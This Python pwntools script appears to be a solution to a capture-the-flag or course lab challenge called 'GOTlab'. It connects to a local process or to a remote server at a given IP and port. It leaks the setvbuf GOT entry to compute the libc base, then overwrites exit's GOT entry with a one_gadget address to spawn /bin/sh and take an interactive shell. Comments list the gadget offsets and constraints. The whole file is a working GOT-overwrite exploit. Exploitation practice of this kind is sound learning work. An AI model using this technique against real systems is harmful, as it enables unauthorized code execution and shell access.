#!/usr/bin/python3

from pwn import *
import sys

e = ELF('./GOTlab')
libc = ELF('./libc-2.29.so')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

if len(sys.argv) > 1:
    r = remote('140.112.31.97', 30103)
else:
    r = process('./GOTlab')

r.sendline(str(0x404028)) # setvbuf
r.recvuntil('address : ')
libc_base = int(r.recvline()[:-1], 16) - libc.symbols['setvbuf']
log.info('libc_base : {}'.format(hex(libc_base)))

r.sendline(str(0x404038)) # exit
r.sendline(str(libc_base + 0x106ef8)) # one_gadget

"""
IN LOCAL:
0xe6e79 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

REMOTE:
0x106ef8 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
r.interactive()
